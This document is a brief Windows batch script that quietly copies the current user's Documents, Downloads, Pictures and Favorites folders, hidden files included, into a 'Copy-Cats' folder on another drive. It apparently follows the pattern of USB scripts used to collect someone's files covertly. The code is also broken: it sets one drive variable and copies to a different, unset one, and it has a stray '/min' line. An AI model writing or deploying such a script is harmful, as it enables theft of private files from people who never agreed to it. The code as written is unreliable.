@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /s /c /d /e /h /i /r /y
echo off
%backupcmd% "%USERPROFILE%\Documents" "%drive%\Copy-Cats\My Doc"
%backupcmd% "%USERPROFILE%\Downloads" "%drive%\Copy-Cats\Download"
%backupcmd% "%USERPROFILE%\pictures" "%drive%\Copy-Cats\My pics"
%backupcmd% "%USERPROFILE%\Favorites" "%drive%\Copy-Cats\Favorites"
@echo off 
cls